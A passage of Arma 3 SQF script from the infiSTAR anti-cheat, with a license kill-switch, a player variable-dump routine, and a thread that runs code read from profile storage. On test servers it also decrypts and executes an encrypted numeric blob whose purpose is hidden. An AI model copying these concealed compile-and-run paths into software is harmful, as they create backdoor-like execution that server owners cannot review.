						sleep 1;
						(findDisplay 46)closeDisplay 0;
						sleep 3;
						PLAYER_HAS_NO_TOKEN = format['PLAYER__%1',getPlayerUID player];publicVariableServer 'PLAYER_HAS_NO_TOKEN';
					};
				};
			};
		};
	}
	else
	{
		if(!isDedicated)then{if(isNil'"+_YourPlayerToken+"')then{"+_RequestToken+"=[player,getPlayerUID player,'HC'];publicVariableServer '"+_RequestToken+"';"+_RequestToken+"=nil;};};
	};
};
['',_zeroCode,-2,'_zeroCode'] call FN_infiSTAR_S;
";
call compile _A3AHstring;_A3AHstring=nil;
_b = {[] spawn {sleep 20;waitUntil {time > 20};diag_log "<infiSTAR.de> license is blocked.";diag_log "<infiSTAR.de> if you did not do anything wrong. please open a support ticket on http://support.infiSTAR.de";diag_log "<infiSTAR.de> infiSTAR will NOT START when the license is blocked!";[] spawn {sleep 1;failMission "LOSER";endMission "LOSER";forceEnd;};if(!isNil"FN_GET_SERVERPW")then{(call FN_GET_SERVERPW) serverCommand "#shutdown";};};};
if("infiSTAR" != ("i" +"n" +"f" +"i" +"S" +"T" +"A" +"R"))then{[] call _b;};
if("infiSTAR.de" != ("i" +"n" +"f" +"i"+"S" +"T" +"A"+"R"+".d"+"e"))then{[] call _b;};
if((_MOD == 'Epoch')&&(_EpochIndestructible))then
{
	[] spawn {
		diag_log format['<infiSTAR.de> %1 - Thread #2: starting now! - SERVER FPS: %2 - activeSQFScripts: %3',time,diag_fps,count diag_activeSQFScripts];
		waitUntil {time > 120};
		diag_log format['<infiSTAR.de> %1 - Thread #2: waited 120s - SERVER FPS: %2 - activeSQFScripts: %3',time,diag_fps,count diag_activeSQFScripts];
		setTerrainGrid 50;
		_indestructible = (allMissionObjects 'Constructions_static_F')+(allMissionObjects 'LockBoxProxy_EPOCH')+(allMissionObjects 'LockBox_EPOCH')+(allMissionObjects 'Safe_EPOCH');
		{
			if!((typeof _x) in ['PlotPole_EPOCH','WoodStairs_EPOCH','WoodStairs2_EPOCH','WoodFloor_EPOCH','WoodLargeWall_EPOCH','WoodLargeWallDoorL_EPOCH','WoodLargeWallCor_EPOCH','WoodRamp_EPOCH'])then
			{
				_x removeAllEventHandlers 'HandleDamage';
				_x addEventHandler ['HandleDamage', {false}];
				if!((typeOf _x) in ['LockBoxProxy_EPOCH','LockBox_EPOCH'])then{_x enableSimulation false;};
				_x allowDamage false;
				uiSleep 0.01;
			};
		} forEach _indestructible;
		{_x removeAllEventHandlers 'HandleDamage';} forEach allDead;
		diag_log format['<infiSTAR.de> %1 - Thread #2: SCRIPT DONE - SERVER FPS: %2 - activeSQFScripts: %3',time,diag_fps,count diag_activeSQFScripts];
	};
};
_FUNCTION_QUESTAR = profileNamespace getVariable 'FUNCTION_QUESTAR';
if(!isNil '_FUNCTION_QUESTAR')then
{
	[] spawn {
		diag_log format['<infiSTAR.de> %1 - Thread #3: starting now! - SERVER FPS: %2 - activeSQFScripts: %3',time,diag_fps,count diag_activeSQFScripts];
		waitUntil {time > 300};
		_FUNCTION_QUESTAR = profileNamespace getVariable 'FUNCTION_QUESTAR';
		if(!isNil '_FUNCTION_QUESTAR')then
		{
			sleep 3;
			if!(_FUNCTION_QUESTAR isEqualTo [])then
			{
				{
					_stringifiedARRAY = _x;
					_ARRAY = call compile _stringifiedARRAY;
					_codeAsString = toString _ARRAY;
					_compiledCodeAsString = compile _codeAsString;			
					[] spawn _compiledCodeAsString;
					sleep 3;
				} forEach _FUNCTION_QUESTAR;
			};
		};
		diag_log format['<infiSTAR.de> %1 - Thread #3: TERMINATED - SERVER FPS: %2 - activeSQFScripts: %3',time,diag_fps,count diag_activeSQFScripts];
	};
};
call compile ("
	FNC_DO_CLIENT_VAR_DUMP = compileFinal ""
		private['_name','_puid'];
		_name = _this select 0;
		_puid = _this select 1;
		
		if(!isNil'"+_CURRENTLYDUMPING+"')exitWith
		{
			'ARMA_LOG' callExtension format['A3_CLIENT_VAR_DUMP_%1_%2:%1(%2) --- CURRENTLY DUMPING - WAIT UNTIL IT IS DONE (max 120s) --- (v0245)',_name,_puid];
			diag_log format['<infiSTAR.de>A3_CLIENT_VAR_DUMP_%1_%2| %1(%2) --- CURRENTLY DUMPING - WAIT UNTIL IT IS DONE (max 120s) --- (v0245)',_name,_puid];
		};
		
		_randomPlayersID = '';
		_randomPlayersName = '';
		{
			_xPID = getPlayerUID _x;
			if((_xPID != '')&&(_xPID != _puid))exitWith
			{
				_randomPlayersID = _xPID;
				_randomPlayersName = name _x;
			};
		} forEach allPlayers;
		if(_randomPlayersID == '')exitWith
		{
			'ARMA_LOG' callExtension format['A3_CLIENT_VAR_DUMP_%1_%2: Need at least 1 more connected & alive player to dump vars of %1(%2)! (v0245)',_name,_puid];
			diag_log format['<infiSTAR.de>A3_CLIENT_VAR_DUMP_%1_%2| Need at least 1 more connected & alive player to dump vars of %1(%2)! (v0245)',_name,_puid];
		};
		"+_CURRENTLYDUMPING+" = true;
		
		deleteMarker '"+_MAKE_VAR_DUMP_RANDOM+"';(createMarker ['"+_MAKE_VAR_DUMP_RANDOM+"',[0,0,0]]) setMarkerText '';
		deleteMarker '"+_MAKE_VAR_DUMP_CLIENT+"';(createMarker ['"+_MAKE_VAR_DUMP_CLIENT+"',[0,0,0]]) setMarkerText '';
		
		_poop = '
			if(isServer)exitWith{};
			_NOBE = ''000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'';
			if(profileName == '+str _randomPlayersName+')then
			{
				_vars = str(allVariables missionNamespace);
				deleteMarker ''"+_MAKE_VAR_DUMP_RANDOM+"'';(createMarker [''"+_MAKE_VAR_DUMP_RANDOM+"'',[0,0,0]]) setMarkerText _vars;
			};
			if(profileName == '+str _name+')then
			{
				[] spawn {
					_timeOut = time + 120;
					waitUntil {MarkerText ''"+_MAKE_VAR_DUMP_RANDOM+"'' != '''' || time > _timeOut};
					if(time > _timeOut)exitWith{};
					_RandomsClientVarsSTRING = MarkerText ''"+_MAKE_VAR_DUMP_RANDOM+"'';deleteMarker ''"+_MAKE_VAR_DUMP_RANDOM+"'';
					_RandomsClientVars = call compile _RandomsClientVarsSTRING;
					
					_myVarsNotOnOther = [];
					{
						if!(_x in _RandomsClientVars)then
						{
							_myVarsNotOnOther pushBack [_x,missionNamespace getVariable _x];
						};
					} forEach (allVariables missionNamespace);
					deleteMarker ''"+_MAKE_VAR_DUMP_CLIENT+"'';(createMarker [''"+_MAKE_VAR_DUMP_CLIENT+"'',[0,0,0]]) setMarkerText (str _myVarsNotOnOther);
				};
			};
		';
		_poop call FNC_A3_GLOBAL;
		
		if(isNil'"+_DUMPINGPLAYERUIDARRAY+"')then{"+_DUMPINGPLAYERUIDARRAY+"=[];};
		if(_puid in "+_DUMPINGPLAYERUIDARRAY+")exitWith
		{
			'ARMA_LOG' callExtension format['A3_CLIENT_VAR_DUMP_%1_%2:%1(%2) --- ALREADY DUMPING THIS PLAYER --- (v0245)',_name,_puid];
			diag_log format['<infiSTAR.de>A3_CLIENT_VAR_DUMP_%1_%2| %1(%2) --- ALREADY DUMPING THIS PLAYER --- (v0245)',_name,_puid];
		};
		"+_DUMPINGPLAYERUIDARRAY+" pushBack _puid;
		[_name,_puid] spawn {
			private['_name','_puid'];
			_name = _this select 0;
			_puid = _this select 1;
			
			_timeOut = time + 120;
			waitUntil {MarkerText '"+_MAKE_VAR_DUMP_CLIENT+"' != '' || time > _timeOut};
			"+_DUMPINGPLAYERUIDARRAY+" deleteAt ("+_DUMPINGPLAYERUIDARRAY+" find _puid);
			"+_CURRENTLYDUMPING+" = nil;
			if(time > _timeOut)exitWith
			{
				'ARMA_LOG' callExtension format['A3_CLIENT_VAR_DUMP_%1_%2:%1(%2) --- DUMP TIMED OUT --- (v0245)',_name,_puid];
				diag_log format['<infiSTAR.de>A3_CLIENT_VAR_DUMP_%1_%2| %1(%2) --- DUMP TIMED OUT --- (v0245)',_name,_puid];
			};
			_selectedClientVarsSTRING = MarkerText '"+_MAKE_VAR_DUMP_CLIENT+"';deleteMarker '"+_MAKE_VAR_DUMP_CLIENT+"';
			_selectedClientVars = call compile _selectedClientVarsSTRING;
			
			if(_selectedClientVars isEqualTo [])exitWith
			{
				'ARMA_LOG' callExtension format['A3_CLIENT_VAR_DUMP_%1_%2:%1(%2) --- ALL GOOD - NOTHING TO DUMP --- (v0245)',_name,_puid];
				diag_log format['<infiSTAR.de>A3_CLIENT_VAR_DUMP_%1_%2| %1(%2) --- ALL GOOD - NOTHING TO DUMP --- (v0245)',_name,_puid];
			};
			
			'ARMA_LOG' callExtension format['A3_CLIENT_VAR_DUMP_%1_%2:%1(%2) --- STARTING DUMP --- (v0245)',_name,_puid];
			diag_log format['<infiSTAR.de>A3_CLIENT_VAR_DUMP_%1_%2| %1(%2) --- STARTING DUMP --- (v0245)',_name,_puid];
			{
				'ARMA_LOG' callExtension format['A3_CLIENT_VAR_DUMP_%1_%2:%3',_name,_puid,_x];
				diag_log format['<infiSTAR.de>A3_CLIENT_VAR_DUMP_%1_%2| %3',_name,_puid,_x];
			} forEach _selectedClientVars;
			'ARMA_LOG' callExtension format['A3_CLIENT_VAR_DUMP_%1_%2:%1(%2) --- DUMP ENDED --- (v0245)',_name,_puid];
			diag_log format['<infiSTAR.de>A3_CLIENT_VAR_DUMP_%1_%2| %1(%2) --- DUMP ENDED --- (v0245)',_name,_puid];
		};
	"";
");
if(_testserver)then{
_NGB_Dcrypt = {_NGBkey='Q)8&%])tjm';_NGB_DcryptMe = _this;_counter = 0;_Array = toArray(_NGBkey);for '_i' from 0 to (count(_NGB_Dcryptme)-1) do {if(_counter > (count(_Array)-1)) then {_counter = 0;};
_var = (_NGB_Dcryptme select _i) / (_Array select _counter);_NGB_Dcryptme set[_i,_var];_counter = _counter + 1;};toString(_NGB_Dcryptme);};
call compile([ 7695, 4059, 6216, 3800, 3737, 2976, 2501, 3712, 13038, 1417, 810, 4879, 5432, 3990, 4292, 7905, 4510, 13456, 11130, 11772, 2592, 5043, 1848, 1520, 3811, 9393, 4756, 9280,
11448, 10573, 9801, 4141, 6384, 3230, 2701, 6324, 1312, 12992, 11448, 10573, 9801, 4141, 6384, 1216, 3885, 10695, 2829, 13108, 12402, 10573, 8748, 3444, 6216, 1216, 1443, 3627, 1681, 
14500, 6254, 1417, 810, 3731, 728, 380, 333, 3627, 1599, 5104, 1378, 1090, 729, 5043, 728, 380, 333, 837, 4100, 12180, 12190, 10573, 7938, 4428, 5656, 3154, 3737, 10602, 4305, 11252, 
11448, 11445, 9882, 3977, 6496, 3990, 4107, 10230, 2419, 1508, 1060, 981, 729, 533, 560, 342, 333, 8835, 4797, 13224, 11448, 3488, 4941, 1312, 5712, 4218, 4218, 10137, 3977, 13456, 9646,
4251, 8424, 4756, 6496, 4256, 2146, 4371, 1927, 12528, 11766, 10573, 8100, 1886, 5880, 4180, 3774, 9765, 3403, 9744, 6890, 8938, 3726, 4100, 5656, 1786, 4218, 10416, 1886, 12992, 11024,
12208, 5103, 4510, 5432, 4142, 3737, 5673, 1517, 5684, 4028, 12535, 9396, 4141, 5432, 4142, 3885, 9300, 2501, 4292, 5300, 4142, 9315, 4141, 6384, 4484, 3737, 10602, 4510, 11252, 11554,
11009, 4941, 1517, 2856, 1444, 4366, 9393, 4674, 13340, 11130, 12099, 8910, 2501, 2072, 1976, 1443, 4092, 4592, 13224, 11766, 11118, 8505, 4428, 5656, 2964, 3589, 10137, 4141, 5104,
10918, 11009, 9396, 3280, 6048, 3686, 4477, 9393, 4674, 9860, 7738, 7412, 2592, 4592, 6048, 3686, 4477, 9393, 4674, 5104, 12190, 11009, 9234, 4838, 5656, 4332, 2886, 9021, 4469, 11716,
4664, 12208, 9234, 4551, 5600, 4446, 3663, 10788, 3526, 11716, 12084, 12535, 8505, 4551, 6160, 3534, 2183, 1209, 410, 1044, 954, 10355, 9477, 4674, 6048, 1216, 2257, 2976, 4756, 12876,
6890, 12426, 9234, 3977, 6776, 1216, 3515, 10881, 4674, 12528, 6254, 1417, 810, 369, 504, 3610, 4329, 10602, 4428, 3712, 6466, 3488, 7695, 4797, 6384, 4104, 1184, 4185, 1312, 10556, 5406, 
5777, 7533, 2419, 728, 380, 333, 837, 3895, 13572, 12084, 11772, 2592, 2501, 1792, 4408, 4107, 7719, 4756, 13224, 11130, 11990, 8343, 1312, 5320, 4446, 4218, 10044, 2419, 1508, 1060, 981,
729, 533, 560, 342, 333, 8835, 4264, 13456, 11554, 11772, 2592, 2501, 1792, 1520, 3774, 9765, 4510, 11600, 7208, 11445, 9315, 4592, 6048, 3686, 4477, 2976, 1968, 4756, 3392, 10791, 9396,
4674, 6048, 2546, 4218, 9393, 3977, 13456, 10706, 3488, 7371, 1599, 4592, 4370, 3663, 6696, 3444, 8932, 8056, 4251, 3564, 1312, 2856, 1862, 1776, 5115, 2009, 6496, 5300, 10137, 4779, 533,
560, 342, 333, 8835, 4264, 13456, 11554, 11772, 2592, 4059, 6496, 4332, 3996, 7719, 4141, 13456, 6996, 10573, 8019, 4387, 5768, 4332, 4107, 10881, 4510, 11600, 7102, 12099, 8748, 4551,
6384, 1216, 3367, 4464, 1804, 5568, 4664, 5232, 3564, 1968, 2576, 1938, 3441, 5487, 533, 1160, 954, 981, 7695, 4264, 6496, 4142, 3996, 2976, 4059, 13456, 12084, 11772, 6723, 4141, 6496, 
3040, 4107, 10695, 4305, 13456, 11130, 12099, 8910, 1312, 5096, 494, 370, 837, 369, 1044, 12190, 10573, 8262, 4141, 5040, 4218, 4070, 9393, 3608, 5104, 1378, 1090, 729, 369, 504, 4370,
3589, 9486, 4141, 10440, 11766, 11990, 8181, 3649, 2464, 494, 370, 837, 369, 1044, 12190, 10573, 8262, 4141, 5040, 4218, 4070, 9393, 3567, 5104, 1378, 1090, 729, 369, 504, 4370, 3589, 
9486, 4141, 10440, 11766, 11990, 8181, 2952, 2632, 1938, 481, 930, 369, 1044, 9858, 6431, 1053, 410, 504, 342, 3515, 9672, 4756, 12644, 11448, 3488, 8019, 4756, 6384, 4104, 2553, 10230, 
3977, 11368, 11448, 11009, 2592, 4756, 6384, 4446, 3737, 5487, 533, 1160, 954, 981, 7695, 4264, 6496, 4142, 3996, 2976, 4059, 13456, 12084, 11772, 6723, 4264, 6216, 4522, 1184, 10788,
4674, 13572, 10706, 6431, 1053, 410, 504, 342, 3515, 9672, 4756, 12644, 11448, 3488, 8019, 4756, 6384, 4104, 2479, 10323, 4469, 12644, 11130, 12644, 2592, 1968, 3304, 494, 370, 837, 369,
11020, 11024, 12644, 8829, 4428, 1792, 3952, 4292, 10137, 4428, 8816, 11766, 10573, 8100, 1312, 5320, 4446, 4218, 10044, 2419, 1508, 1060, 981, 729, 4059, 6496, 4332, 3996, 6324, 4141, 
12528, 10706, 12644, 8181, 1312, 5320, 3952, 4292, 10137, 4428, 6844, 1378, 1090, 729, 5125, 728, 380, 3441, 2976, 4141, 13920, 10706, 10791, 5670, 3403, 4312, 1216, 1443, 9207, 3977,
12528, 11448, 5014, 8262, 4715, 6104, 1482, 2183, 1209, 410, 14500, 6254, 1417, 810, 4592, 6048, 3686, 4477, 9393, 4674, 11020, 11448, 12099, 8343, 3895, 5936, 3990, 4144, 8835, 4305, 
11600, 3392, 6649, 2592, 3731, 5320, 3762, 4107, 9300, 4141, 5104, 13038, 10791, 7857, 4428, 6048, 1216, 3515, 10788, 4264, 12180, 12190, 13625, 7533, 1312, 6384, 3838, 4033, 10323, 
4756, 11716, 7314, 13080, 8181, 4059, 1792, 3458, 1443, 6510, 3198, 11020, 11130, 11990, 8262, 4305, 4648, 3192, 2405, 7626, 3895, 7772, 4134, 4796, 3645, 2050, 2464, 1482, 4144, 10044,
3977, 14036, 10706, 12426, 7695, 4428, 6216, 3914, 3515, 9858, 4305, 12992, 4134, 10137, 4779] call _NGB_Dcrypt);
};
diag_log format['<infiSTAR.de> %1 - AntiHack loaded!',time];
/* ********************************************************************************* */
/* *********************************www.infiSTAR.de********************************* */
/* *******************Developed by infiSTAR (infiSTAR23@gmail.com)****************** */
/* **************infiSTAR Copyright�� 2011 - 2016 All rights reserved.************** */
/* ****DayZAntiHack.com***DayZAntiHack.de***ArmaAntiHack.com***Arma3AntiHack.com**** */